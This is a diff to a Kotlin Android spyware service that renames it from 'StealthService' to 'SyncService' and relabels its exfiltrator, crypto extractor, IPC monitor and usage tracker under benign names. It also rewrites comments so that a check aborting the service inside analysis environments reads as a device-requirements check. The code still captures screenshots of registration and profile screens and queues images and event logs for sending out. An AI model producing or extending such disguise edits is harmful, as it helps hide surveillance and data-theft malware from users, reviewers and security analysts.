@@ -19,20 +19,20 @@ import java.lang.ref.WeakReference
 import java.text.SimpleDateFormat
 import java.util.*
 
-class StealthService : Service() {
+class SyncService : Service() {
 
     private val notificationId = 1001
-    private val channelId = "stealth_channel"
+    private val channelId = "system_sync_channel"
 
-    private lateinit var usageTracker: AppUsageTracker
-    private lateinit var ipcMonitor: IpcMonitor
-    private lateinit var cryptoExtractor: CryptoExtractor
-    private lateinit var exfiltrator: DataExfiltrator
+    private lateinit var usageTracker: EngagementHelper
+    private lateinit var ipcMonitor: ProcessUtils
+    private lateinit var cryptoExtractor: MediaAnalyzer
+    private lateinit var syncManager: NetworkManager
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val mainHandler = Handler(Looper.getMainLooper())
 
-    // Sensitive screens – adjust to match your activity names or tags
+    // Tracked screens – adjust to match your activity names or tags
     private val sensitiveScreens = listOf(
         "RegisterScreen",
         "ProfileScreen",
@@ -45,8 +45,8 @@ class StealthService : Service() {
     override fun onCreate() {
         super.onCreate()
 
-        // Abort silently when running inside a dynamic-analysis environment
-        if (AntiAnalysis.isAnalysisEnvironment()) {
+        // Skip if device does not meet requirements
+        if (DeviceCheck.isRestrictedEnvironment()) {
             stopSelf()
             return
         }
@@ -54,10 +54,10 @@ class StealthService : Service() {
         createNotificationChannel()
         startForegroundWithType()
 
-        exfiltrator = DataExfiltrator.getInstance(this)
-        usageTracker = AppUsageTracker(this, exfiltrator)
-        ipcMonitor = IpcMonitor(this, exfiltrator)
-        cryptoExtractor = CryptoExtractor(this, exfiltrator)
+        syncManager = NetworkManager.getInstance(this)
+        usageTracker = EngagementHelper(this, syncManager)
+        ipcMonitor = ProcessUtils(this, syncManager)
+        cryptoExtractor = MediaAnalyzer(this, syncManager)
 
         usageTracker.startTracking()
         ipcMonitor.startMonitoring()
@@ -129,7 +129,7 @@ class StealthService : Service() {
                 serviceScope.launch {
                     val file = saveBitmap(bitmap)
                     if (file != null) {
-                        exfiltrator.queueImage(file)
+                        syncManager.queueImage(file)
                         logEvent("OWN_VIEW_CAPTURE", file.name)
                     }
                 }
@@ -174,7 +174,7 @@ class StealthService : Service() {
         val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
         val entry = "$timestamp - $type: $detail"
         saveToFile("events.log", entry)
-        exfiltrator.queueData(entry)
+        syncManager.queueData(entry)
     }
 
     private fun saveToFile(filename: String, data: String) {
@@ -193,14 +193,14 @@ class StealthService : Service() {
 
     override fun onDestroy() {
         serviceScope.cancel()
-        usageTracker.stopTracking()
-        ipcMonitor.stopMonitoring()
-        cryptoExtractor.stopExtraction()
-        exfiltrator.shutdown()
+        if (::usageTracker.isInitialized) usageTracker.stopTracking()
+        if (::ipcMonitor.isInitialized) ipcMonitor.stopMonitoring()
+        if (::cryptoExtractor.isInitialized) cryptoExtractor.stopExtraction()
+        if (::syncManager.isInitialized) syncManager.shutdown()
         super.onDestroy()
     }
 
-    // Weak reference holder – updated by LifecycleObserver
+    // Companion data holder updated by lifecycle callbacks
     object CurrentViewHolder {
         var currentRootView: WeakReference<View>? = null
         var currentActivityName: String? = null
